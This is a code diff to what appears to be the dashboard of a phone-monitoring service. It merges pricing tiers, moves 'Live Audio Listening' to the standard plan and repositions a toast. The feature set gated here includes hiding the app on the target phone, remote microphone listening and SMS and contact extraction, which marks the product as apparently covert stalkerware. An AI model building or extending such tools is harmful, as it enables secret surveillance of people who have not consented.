@@ -40,8 +40,7 @@ interface PlanLimits {
 // Compute plan limits from plan name — used as the source of truth
 const getPlanLimits = (plan: string): PlanLimits => {
     const p = (plan || '').toLowerCase();
-    if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, hideApp: true, bulkDownload: true, maxDevices: 10 };
-    if (p === 'standard') return { photos: 500, videos: 50, sms: true, contacts: true, torch: true, vibration: true, hideApp: false, bulkDownload: true, maxDevices: 5 };
+    if (p === 'standard' || p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, hideApp: true, bulkDownload: true, maxDevices: 10 };
     return { photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, hideApp: false, bulkDownload: false, maxDevices: 1 };
 };
 
@@ -56,7 +55,7 @@ export default function Home() {
     const [isFetchingFolders, setIsFetchingFolders] = useState(false);
 
     // Plan State
-    const [userPlan, setUserPlan] = useState<'basic' | 'standard' | 'premium'>('basic');
+    const [userPlan, setUserPlan] = useState<'basic' | 'standard'>('basic');
     const [planLimits, setPlanLimits] = useState<PlanLimits>(
         getPlanLimits('basic')
     );
@@ -66,7 +65,7 @@ export default function Home() {
     const [showBulkDownloadModal, setShowBulkDownloadModal] = useState(false);
     const [bulkDownloadFolder, setBulkDownloadFolder] = useState('');
     const [upgradeFeature, setUpgradeFeature] = useState('');
-    const [requiredPlan, setRequiredPlan] = useState<'standard' | 'premium'>('standard');
+    const [requiredPlan, setRequiredPlan] = useState<'standard'>('standard');
 
     // ZIP Download State
     const [showSyncOptionsModal, setShowSyncOptionsModal] = useState(false);
@@ -341,7 +340,7 @@ export default function Home() {
     const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });
 
     // Helper function to show upgrade modal
-    const showUpgradePrompt = (feature: string, required: 'standard' | 'premium') => {
+    const showUpgradePrompt = (feature: string, required: 'standard') => {
         setUpgradeFeature(feature);
         setRequiredPlan(required);
         setShowUpgradeModal(true);
@@ -1254,8 +1253,8 @@ export default function Home() {
 
     // --- Live Audio Functions ---
     const startLiveAudio = useCallback(() => {
-        if (userPlan !== 'premium') {
-            showUpgradePrompt('Live Audio Listening', 'premium');
+        if (userPlan !== 'standard') {
+            showUpgradePrompt('Live Audio Listening', 'standard');
             return;
         }
         if (!socket || !selectedDeviceId || !session?.user?.uuid) {
@@ -2926,11 +2925,11 @@ END:VCARD`;
             {/* Device Online Toast */}
             <AnimatePresence>
                 {deviceToast && (
-                    <motion.div 
-                        initial={{ opacity: 0, y: 50, scale: 0.95 }}
+                    <motion.div
+                        initial={{ opacity: 0, y: -50, scale: 0.95 }}
                         animate={{ opacity: 1, y: 0, scale: 1 }}
-                        exit={{ opacity: 0, y: 20, scale: 0.95 }}
-                        className="fixed bottom-6 right-6 z-[400] flex items-center gap-3 bg-[#121316]/95 backdrop-blur-xl border border-emerald-500/30 px-5 py-3.5 rounded-2xl shadow-[0_10px_35px_rgba(16,185,129,0.2)]"
+                        exit={{ opacity: 0, y: -20, scale: 0.95 }}
+                        className="fixed top-20 right-6 z-[400] flex items-center gap-3 bg-[#121316]/95 backdrop-blur-xl border border-emerald-500/30 px-5 py-3.5 rounded-2xl shadow-[0_10px_35px_rgba(16,185,129,0.2)]"
                     >
                         <div className="w-3 h-3 rounded-full bg-emerald-500 shadow-[0_0_12px_#10b981] animate-pulse" />
                         <div>
